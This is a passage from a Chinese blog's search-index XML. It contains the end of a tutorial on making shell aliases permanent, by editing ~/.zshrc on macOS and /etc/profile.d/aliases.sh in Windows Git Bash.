~/.zshrc</code></pre></div></div><p>然后添加自己想添加的别名，如<code>alias v="vim"</code></p><p>最后</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ojbtyjlluxp18y"></i><span>shell</span><div class="collapse show" id="collapse-ojbtyjlluxp18y"><pre><code class="hljs shell">source ~/.zshrc</code></pre></div></div><h2 id="windows的git-bash设置永久别名">windows的gitbash设置永久别名</h2><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-txuqx5lluxp18y"></i><span>shell</span><div class="collapse show" id="collapse-txuqx5lluxp18y"><pre><code class="hljs shell">vim /etc/profile.d/aliases.sh # 编辑aliases文件</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/macOS%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4%E5%88%AB%E5%90%8D/20230828210441159140_423_20230128114558552930_510_image-20230128114429306.png" alt="image-20230128114429306"><figcaption aria-hidden="true">image-20230128114429306</figcaption></figure><p>文件中已经给出了一些实例，按需添加即可，比如可以将常用的脚本添加进来。</p><p>之后重启终端即可。</p>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
